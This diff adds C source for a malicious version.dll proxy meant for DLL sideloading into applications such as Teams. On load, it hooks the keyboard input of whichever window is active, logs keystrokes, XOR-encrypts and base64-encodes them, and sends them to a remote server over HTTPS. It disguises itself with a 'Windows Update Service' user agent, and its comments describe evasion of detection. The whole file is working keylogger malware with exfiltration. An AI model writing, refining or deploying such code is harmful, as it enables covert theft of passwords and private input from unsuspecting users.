@@ -1,0 +1,196 @@
+#include <windows.h>
+#include <winhttp.h>
+#include <stdio.h>
+
+// --- DLL Proxying Directives for version.dll ---
+// These pragma directives instruct the linker to forward exports to the legitimate system DLL.
+// When an application (e.g., Teams.exe) attempts to load version.dll, it will load our malicious DLL first, 
+// execute our payload, and forward all actual API calls to the real C:\Windows\System32\version.dll.
+#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
+#pragma comment(linker, "/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle")
+#pragma comment(linker, "/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA")
+#pragma comment(linker, "/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW")
+#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW")
+#pragma comment(linker, "/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA")
+#pragma comment(linker, "/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW")
+#pragma comment(linker, "/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA")
+#pragma comment(linker, "/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW")
+#pragma comment(linker, "/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA")
+#pragma comment(linker, "/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW")
+#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA")
+#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW")
+
+#pragma comment(lib, "winhttp.lib")
+
+#define TIMER_INTERVAL 1000 // 1 second
+
+HINSTANCE hInstance;
+char g_keystrokeBuffer[2048] = {0};
+DWORD g_bufferIndex = 0;
+bool g_isRunning = true;
+HHOOK hLocalKeyboardHook = NULL;
+DWORD g_targetThreadId = 0;
+
+// Base64 Encoding Table
+static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+// Base64 encoding function
+void Base64Encode(const unsigned char* in, DWORD inLen, char* out, DWORD* outLen) {
+    DWORD i = 0, j = 0;
+    while (i < inLen) {
+        DWORD a = i < inLen ? in[i++] : 0;
+        DWORD b = i < inLen ? in[i++] : 0;
+        DWORD c = i < inLen ? in[i++] : 0;
+
+        out[j++] = b64_table[a >> 2];
+        out[j++] = b64_table[((a & 3) << 4) | (b >> 4)];
+        out[j++] = i > inLen ? '=' : b64_table[((b & 15) << 2) | (c >> 6)];
+        out[j++] = i > inLen + 1 ? '=' : b64_table[c & 63];
+    }
+    out[j] = '\0';
+    if (outLen) *outLen = j;
+}
+
+// Basic XOR Encryption to evade plaintext signatures
+void EncryptPayload(char* data, DWORD length) {
+    // Stack string obfuscation for XOR Key to evade .rdata dump analysis
+    char xor_key[] = {'S','3','c','r','3','t','K','3','y','\0'};
+    int keyLen = 9;
+    for (DWORD i = 0; i < length; ++i) {
+        data[i] ^= xor_key[i % keyLen];
+    }
+    // Zero out key to minimize memory footprint visibility
+    SecureZeroMemory(xor_key, sizeof(xor_key));
+}
+
+void SendKeystrokes() {
+    // Benign User Agent Name matching legitimate telemetry
+    HINTERNET hSession = WinHttpOpen(L"Windows Update Service", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (hSession) {
+        // True HTTPS Port 443 with a domain name (not an IP address)
+        HINTERNET hConnect = WinHttpConnect(hSession, L"update.yourdomain.com", 443, 0); 
+        if (hConnect) {
+            // Apply WINHTTP_FLAG_SECURE to force SSL/TLS Encryption
+            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/submit.php", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+            if (hRequest) {
+                // EXPLICIT OPSEC IMPROVEMENT: 
+                // We REMOVED SECURITY_FLAG_IGNORE_* flags. WinHTTP will now natively validate the TLS certificate against the Windows root store.
+                // A valid CA-signed domain certificate (e.g. Let's Encrypt) is now strictly required.
+
+                // 1. Encrypt Payload via Stack-String XOR
+                EncryptPayload(g_keystrokeBuffer, g_bufferIndex);
+                
+                // 2. Base64 Encode to evade High-Entropy binary network anomalies
+                char b64Buffer[4096] = {0};
+                DWORD b64Len = 0;
+                Base64Encode((const unsigned char*)g_keystrokeBuffer, g_bufferIndex, b64Buffer, &b64Len);
+
+                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, b64Buffer, b64Len, b64Len, 0)) {
+                    WinHttpReceiveResponse(hRequest, NULL);
+                }
+                WinHttpCloseHandle(hRequest);
+            }
+            WinHttpCloseHandle(hConnect);
+        }
+        WinHttpCloseHandle(hSession);
+    }
+}
+
+// Local Thread Keyboard Hook (Evades WH_KEYBOARD_LL global hook scrutiny)
+LRESULT CALLBACK LocalKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        // Only trigger on KeyDown to simplify logging
+        if (!(lParam & 0x80000000)) { 
+            UINT vkey = wParam;
+            char szKeyName[256] = {0};
+            UINT scanCode = MapVirtualKey(vkey, MAPVK_VK_TO_VSC);
+
+            switch (vkey) {
+                case VK_LSHIFT: case VK_RSHIFT: case VK_SHIFT:
+                case VK_LCONTROL: case VK_RCONTROL: case VK_CONTROL:
+                case VK_LMENU: case VK_RMENU: case VK_MENU:
+                    break;
+            }
+
+            if (GetKeyNameTextA(scanCode << 16, szKeyName, sizeof(szKeyName)) > 0) {
+                if (g_bufferIndex < sizeof(g_keystrokeBuffer) - 256) {
+                    int len = snprintf(g_keystrokeBuffer + g_bufferIndex, sizeof(g_keystrokeBuffer) - g_bufferIndex, "[%s]", szKeyName);
+                    if (len > 0) {
+                        g_bufferIndex += len;
+                    }
+                }
+            }
+        }
+    }
+    return CallNextHookEx(hLocalKeyboardHook, nCode, wParam, lParam);
+}
+
+// The lazy execution thread - detached from DllMain
+DWORD WINAPI KeyloggerWorker(LPVOID lpParam) {
+    DWORD lastExfilTime = GetTickCount();
+
+    while (g_isRunning) {
+        // Find the active window thread
+        HWND hForeground = GetForegroundWindow();
+        if (hForeground) {
+            DWORD currentThreadId = GetWindowThreadProcessId(hForeground, NULL);
+            
+            // If the user switched to a newly active window thread, we reposition the local hook
+            if (currentThreadId != g_targetThreadId) {
+                if (hLocalKeyboardHook) {
+                    UnhookWindowsHookEx(hLocalKeyboardHook);
+                    hLocalKeyboardHook = NULL;
+                }
+                
+                // Only hook if it's not our own thread and we acquired a valid ID
+                if (currentThreadId != GetCurrentThreadId() && currentThreadId != 0) {
+                   g_targetThreadId = currentThreadId;
+                   // Local hook (WH_KEYBOARD) instead of Global Low Level (WH_KEYBOARD_LL)
+                   hLocalKeyboardHook = SetWindowsHookEx(WH_KEYBOARD, LocalKeyboardProc, hInstance, g_targetThreadId);
+                }
+            }
+        }
+
+        // Periodic exfiltration check
+        if (GetTickCount() - lastExfilTime > TIMER_INTERVAL && g_bufferIndex > 0) {
+            SendKeystrokes();
+            memset(g_keystrokeBuffer, 0, sizeof(g_keystrokeBuffer));
+            g_bufferIndex = 0;
+            lastExfilTime = GetTickCount();
+        }
+        
+        // Ensure thread message pump is serviced for the hook to work correctly
+        MSG msg;
+        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        
+        Sleep(50); // Relax CPU usage
+    }
+
+    if (hLocalKeyboardHook) {
+        UnhookWindowsHookEx(hLocalKeyboardHook);
+    }
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            // DLL Proxy architectures rely on passive injection by the host binary.
+            // We spawn a detached worker thread. Avoid heavy initializations here.
+            DisableThreadLibraryCalls(hinstDLL);
+            hInstance = hinstDLL;
+            CreateThread(NULL, 0, KeyloggerWorker, NULL, 0, NULL);
+            break;
+        case DLL_PROCESS_DETACH:
+            g_isRunning = false;
+            break;
+    }
+    return TRUE;
+}
